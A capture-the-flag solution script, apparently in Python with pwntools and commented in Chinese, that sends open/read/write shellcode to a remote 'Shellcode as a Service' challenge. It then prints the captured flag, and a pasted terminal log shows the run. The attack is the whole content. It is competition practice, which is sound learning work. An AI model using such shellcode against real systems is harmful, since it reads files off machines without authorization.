from pwn import *

# 设置目标架构为 64 位
context.arch = 'amd64'

# 本地测试用 process('./saas')，远程用 remote
io = remote('svtctf.m0lecon.it', 13402)

# 使用 shellcraft 自动生成 ORW 链
# 1. open('flag')
# 2. read(rax, rsp, 100)  <- rax 是上一步 open 返回的 fd
# 3. write(1, rsp, 100)
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

payload = asm(shellcode)

# 发送 Payload
io.sendline(payload)

# 打印返回结果（应该就是 flag）
print(io.recvall().decode(errors='ignore'))

#(pwn_env) hanabi@polito:~/svt_ctf/round_2/saas$ python3 solution.py 
#[+] Opening connection to svtctf.m0lecon.it on port 13402: Done
#[+] Receiving all data: Done (245B)
#[*] Closed connection to svtctf.m0lecon.it port 13402
#Welcome to the Shellcode as a Service!
#Just write your shellcode and we'll execute it for you!
#Be careful, we have some restrictions in place...
#svt{str1ct_bu7_st1ll_to0_l4rg3_tEufi9Hl1hgYJkp9}
#H1jdZH\x0f\x05j\x01_jdZHj\x01X\x0f\x05